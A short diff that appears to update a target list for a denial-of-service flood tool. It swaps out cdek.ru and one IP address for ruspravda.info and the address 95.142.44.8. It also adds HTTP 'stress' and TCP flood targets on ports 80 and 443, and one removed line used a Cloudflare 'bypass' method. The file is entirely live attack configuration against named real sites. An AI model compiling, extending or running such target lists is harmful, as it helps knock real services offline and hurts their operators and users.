@@ -3,9 +3,11 @@
 
 #zhnec
 
-https://cdek.ru/ http://cdek.ru/ --http-methods bypass cfb
+https://ruspravda.info http://ruspravda.info --http-methods stress
 
-http://78.46.28.63:80 http://78.46.28.63:443 --http-methods stress
+http://95.142.44.8:80 http://95.142.44.8:443 --http-methods stress
+
+tcp://95.142.44.8:80:80 tcp://95.142.44.8:80:443
 
 
 
